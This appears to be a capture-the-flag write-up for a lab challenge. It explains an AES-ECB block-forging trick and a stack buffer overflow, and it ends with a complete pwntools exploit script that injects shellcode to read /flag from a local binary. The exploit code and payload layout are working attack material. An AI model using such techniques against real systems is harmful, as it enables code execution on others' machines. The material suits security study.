## Note: The Entire Workflow was same as easy only here the source code was not given so the rip win address and rbp saved address was to be found manually via gdb ...

### 1. The bug

### The C program:
- verifies only the first decrypted block
- then restarts AES
- then decrypts the rest into plaintext.message
- but plaintext.message is only 53 bytes

So a long decrypted body overflows the stack.

### 2. Why ECB matters

With ECB:
- each 16-byte block is encrypted independently

So when dispatch encrypts a 16-byte message:
- block 1 = valid VERIFIED || len
- block 2 = encryption of your chosen 16 bytes
- block 3 = encryption of the PKCS#7 padding block

That gave me an encryption oracle for arbitrary 16-byte plaintext blocks.

### 3. Offset to RIP

From the stack dump:
- message starts at 0x7fffffffe840
- saved RIP is at 0x7fffffffe8b8

**Difference:**
```
    0x78 == 120
```
So:
```
    bytes 0..119 = pre-RIP area
    bytes 120..127 = overwritten RIP
```

### 4. RIP control

- My BBBBBBBB control test showed:
```
    saved RIP became 0x4242424242424242
```
- So my forged ciphertext really does control RIP.

### 5. Shellcode fit

- My shellcode length:
```
    len(sc) == 66
```
- With a 16-byte sled:
```
    16 + 66 = 82 <= 120
```
- So it fits before RIP.

**The body structure**

- This is the key layout:
```
pre_rip = sled + sc
body = pre_rip.ljust(120, b"A") + p64(target_address)
```
Why?
```
    pad to 120 to reach RIP
    then append 8 bytes for RIP
    total body = 128 bytes
```
**My ciphertext structure**

- Conceptually:
```
forged = first_block + Enc(P0) + Enc(P1) + ... + Enc(P7) + pad_block
```
- where:
```
    P0..P7 are the 8 chunks of your 128-byte body
    first_block comes from dispatch block 1
    each Enc(Pi) comes from dispatch block 2 for that chunk
    pad_block comes from dispatch block 3
```
- That is why the final payload length is:
```
    16 + 8*16 + 16 = 160
```

### Python Script to Solve

```python
from pwn import *

context.arch = "amd64"
context.os = "linux"
context.log_level = "error"

def enc_block(chunk16):
    assert len(chunk16) == 16
    p = process("./dispatch")
    p.send(chunk16)
    ct = p.recvn(48)
    p.close()
    return ct[16:32]

def get_bookends():
    p = process("./dispatch")
    p.send(b"A" * 16)
    ct = p.recvn(48)
    p.close()
    return ct[:16], ct[32:48]

def forge_from_body(body):
    assert len(body) == 128
    first_block, pad_block = get_bookends()
    chunks = [body[i:i+16] for i in range(0, 128, 16)]
    enc_body = b"".join(enc_block(c) for c in chunks)
    return first_block + enc_body + pad_block

buffer_addr = 0x7fffffffe840
target_address = buffer_addr + 0x8

sc = asm(
    shellcraft.open("/flag", 0) +
    shellcraft.read("rax", "rsp", 0x100) +
    shellcraft.write(1, "rsp", 0x100) +
    shellcraft.exit(0)
)

sled = b"\x90" * 16
pre_rip = sled + sc
assert len(pre_rip) <= 120

body = pre_rip.ljust(120, b"A") + p64(target_address)
assert len(body) == 128

payload = forge_from_body(body)
assert len(payload) == 160

p = process("./vulnerable-overflow")
p.send(payload)
p.shutdown("send")
out = p.recvall()
print(out.decode("latin1", errors="replace"))
```
